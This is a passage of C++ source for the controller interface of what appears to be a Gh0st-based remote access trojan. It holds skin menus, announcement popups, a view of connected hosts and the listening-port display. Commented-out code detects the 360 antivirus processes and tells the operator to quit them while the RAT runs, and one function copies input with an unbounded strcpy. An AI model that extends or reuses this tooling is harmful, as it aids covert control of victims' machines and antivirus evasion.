			{
				m_dlg.szMent = szBuffer;
				m_dlg.DoModal();
				//Point->PupopAnnouncement(szBuffer);
			}
			if(CMainFrame::MarkHeard==FALSE)
			{
				CMainFrame::MarkHeard = TRUE;
				m_dlg.szMent = szBuffer;
				m_dlg.DoModal();

				//Point->PupopAnnouncement(szBuffer);
			}
		}
	}
	else
		closesocket(m_Socket);


	return 0;
}

VOID CMainFrame::PupopAnnouncement(LPSTR szStr)
{
	static char Buffer[2000]={NULL};
	ZeroMemory(Buffer,2000);
	strcpy(Buffer,szStr);
	CHAR *szPoint = strstr(Buffer,"\\t");
	if(szPoint)
	{
		*szPoint=' ';
		szPoint++;
		*szPoint='\t';
	}
	szPoint = strstr(Buffer,"\\r");
	if(szPoint)
	{
		*szPoint=' ';
		szPoint++;
		*szPoint='\r';
	}

	((CGh0stApp *)AfxGetApp())->pIntro=Buffer;
	((CGh0stApp *)AfxGetApp())->OnAppAbout();


}


void CMainFrame::OnOfficail() 
{
	// TODO: Add your command handler code here
	/*
	MarkHeard = FALSE;

	CloseHandle(CreateThread(NULL,NULL,Announcement,NULL,NULL,NULL));
	*/
	MessageBox("��ʱ�ر�!");
}


DWORD ProcessToPID( LPCTSTR lpszProcess )
{
	DWORD dwRet = 0;
	HANDLE hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof( PROCESSENTRY32 );
	Process32First( hSnapshot, &pe32 );
	do
	{
		if ( lstrcmpi( pe32.szExeFile, lpszProcess ) == 0 )
		{
			dwRet = pe32.th32ProcessID;
			break;
		}
	} while ( Process32Next( hSnapshot, &pe32 ) );
	
	CloseHandle( hSnapshot );
	return dwRet;
}

VOID CMainFrame::CloseAnnouncement()
{
//	KillTimer(0x101);
	return;
}


void CMainFrame::OnTimer(UINT nIDEvent) 
{
	// TODO: Add your message handler code here and/or call default
	if(nIDEvent == 0x100)
/*	{

		KillTimer(nIDEvent);
		CLogonDialog m_Logon;
		m_Logon.DoModal();
		CloseHandle(CreateThread(NULL,NULL,CheckUpdata,NULL,NULL,NULL));

	}

	if(nIDEvent == 0x101)
	{
		CloseHandle(CreateThread(NULL,NULL,Announcement,NULL,NULL,NULL));
	}*/

/*	if(nIDEvent == 0x102)
	{
	if(ProcessToPID("360sd.exe") || ProcessToPID("360tray.exe"))
		{
			KillTimer(0x103);
			MessageBox("���ս���RAT�������ʱ �벻Ҫ����360ɱ�� ���� 360��ȫ��ʿ ���˳�360.","�ս���RAT��ʾ",MB_OK|MB_ICONINFORMATION);
			SetTimer(0x103,20000,NULL);
		}
	}*/
/*	if(nIDEvent == 0x200)
	{
		CString szTitle;
		GetWindowText(szTitle);

		if(szTitle!=EncryStr)
		{
			CString szIniTitle=((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Settings", "Title","");
			if(szIniTitle != szTitle)//SB��ı���
			{
				KillTimer(nIDEvent);
				OnClose();
			}
		}
	}*/
	CFrameWnd::OnTimer(nIDEvent);
}

void CMainFrame::OnAppAbout() 
{
	// TODO: Add your command handler code here
	OnAboutterminate();
}

void CMainFrame::OnTools() 
{
	// TODO: Add your command handler code here
	static CMyToolsKit *m_ToolKit =NULL;
	if(m_ToolKit==NULL)
	{
		m_ToolKit= new CMyToolsKit;
		m_ToolKit->Create(IDD_TOOLS_DIALOG,GetDesktopWindow());
	}	
	m_ToolKit->ShowWindow(SW_SHOW);
}


void CMainFrame::OnGxip() 
{
	// TODO: Add your command handler code here
	CUpdateDlg	 dlg;
	dlg.DoModal();
}

void CMainFrame::OnAddSkin() 
{
	// TODO: Add your command handler code here
	if (((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Ƥ��", "·��", "") == "��")
	{
		((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Ƥ��", "·��", "Skins\\aero.she");
		SkinH_AttachEx(_T("Skins\\aero.she"),NULL); //Ƥ��·��
		SkinH_AdjustHSV(0,-100,0);
		SkinH_SetMenuAlpha(200);
		//		SkinH_SetAero(TRUE);
	}
	if (((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Ƥ��", "·��", "") == "")
	{
		((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Ƥ��", "·��", "Skins\\aero.she");
		SkinH_AttachEx(_T("Skins\\aero.she"),NULL); //Ƥ��·��
		SkinH_SetMenuAlpha(200);
		//		SkinH_SetAero(TRUE);
	}
	else
	{
		MessageBox("��ǰ�����Ѽ���Ƥ��.","��ʾ",MB_ICONINFORMATION);
		return;
	}
}

void CMainFrame::OnDelSkin() 
{
	// TODO: Add your command handler code here
	if (((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Ƥ��", "·��", "") == "��")
	{
        MessageBox("��ǰ����δ����Ƥ��.","��ʾ",MB_ICONINFORMATION);
		return;
	}
	else
	{
		((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Ƥ��", "·��", "��");
		SkinH_Detach();
	}
}

void CMainFrame::OnBlackSkin() 
{
	// TODO: Add your command handler code here
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Ƥ��", "·��", "Skins\\longhorn.she");
	SkinH_AttachEx(_T("Skins\\longhorn.she"),NULL); //Ƥ��·��
	SkinH_SetMenuAlpha(200);
	//	SkinH_SetAero(TRUE);
}

void CMainFrame::OnBlueSkin() 
{
	// TODO: Add your command handler code here
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Ƥ��", "·��", "Skins\\enjoy.she");
	SkinH_AttachEx(_T("Skins\\enjoy.she"),NULL); //Ƥ��·��
	SkinH_SetMenuAlpha(200);
	//	SkinH_SetAero(TRUE);
}

void CMainFrame::OnSilverSkin() 
{
	// TODO: Add your command handler code here
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Ƥ��", "·��", "Skins\\dogmax.she");
	SkinH_AttachEx(_T("Skins\\dogmax.she"),NULL); //Ƥ��·��
	SkinH_SetMenuAlpha(200);
	//  SkinH_SetAero(TRUE);
}

void CMainFrame::OnRedSkin() 
{
	// TODO: Add your command handler code here
    ((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Ƥ��", "·��", "Skins\\china.she");
	SkinH_AttachEx(_T("Skins\\china.she"),NULL); //Ƥ��·��
	SkinH_SetMenuAlpha(200);
	//	SkinH_SetAero(TRUE);
}
void CMainFrame::OnChangeSkin() 
{
	// TODO: Add your command handler code here
	CSkin dlg;
	dlg.DoModal();
}
void CMainFrame::ShowMyText(LPCTSTR Text,int Mode)
{
	g_pEventView->InsertItem(Text,Mode);
}

void CMainFrame::StartWork()
{
	//ȡIP��ַ�б���Ϣ
	PHOSTENT hostinfo;
	char name[512] = {0};
	if(gethostname (name,sizeof(name)) != 0 ||
		(hostinfo = gethostbyname(name)) == NULL)
	{
		ShowMyText("ȡ���ص�ַ�б�ʧ�� ...",2);
		return;
	}
	CString m_AddrList;
	struct sockaddr_in dest;
	for(int i=0; hostinfo->h_addr_list[i] != NULL ;i++)
	{
		memcpy(&(dest.sin_addr), 
			hostinfo->h_addr_list[i],
			hostinfo->h_length);
		m_AddrList += inet_ntoa(dest.sin_addr);
		m_AddrList += "-";
	}
	// ��ȡ�����˿�
	char m_Port[200] = {0};
	char m_Show[512] = {0};
	CString m_listening_port = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Settings", "ListenPort", "1100");
	wsprintf(m_Port,"%s",m_listening_port);
	wsprintf(m_Show,"����IP:[%s] �˿�:[%s]",m_AddrList.Left(m_AddrList.GetLength() - 1),m_Port);
	ShowMyText(m_Show,0);
	
}

BOOL CMainFrame::OnCreateClient(LPCREATESTRUCT lpcs, CCreateContext* pContext) 
{
	if (!m_WndSplitter.CreateStatic(this, 2, 1,WS_CHILD | WS_VISIBLE))//����һ����̬�������ڣ���Ϊ����һ��
		return FALSE;
	
	CRect rc;
	GetWindowRect(&rc);
	int width = rc.Width();
	int height= rc.Height();
	if (!m_WndSplitter.CreateView(0, 0, RUNTIME_CLASS(CGh0stView),CSize(0, 0), pContext) ||		//��CGh0stView���ӵ�0��0�д�����500�������300�Ǹ߶�
		!m_WndSplitter.CreateView(1, 0, RUNTIME_CLASS(CEventView),CSize(0, 200),pContext))
	{
		m_WndSplitter.DestroyWindow();
		return FALSE;
	}
	g_pConnectView = (CGh0stView*) m_WndSplitter.GetPane(0,0);
	g_pEventView = (CEventView*) m_WndSplitter.GetPane(1,0);
	return TRUE;
}



void CMainFrame::OnSize(UINT nType, int cx, int cy) 
{
	CFrameWnd::OnSize(nType, cx, cy);
	
	if(g_pConnectView != NULL && cx > 0)
	{
		m_WndSplitter.SetColumnInfo(0,cx * 1/4 + 9,0);
		m_WndSplitter.SetRowInfo(0,cy * 5/8 ,0);
		m_WndSplitter.RecalcLayout();
		UINT nID,nStyle;
		int Width;
		m_wndStatusBar.GetPaneInfo(1,nID,nStyle,Width);
		Width = cx * 2/6 - 15;
		m_wndStatusBar.SetPaneInfo(1,nID,nStyle,Width);
	}	
}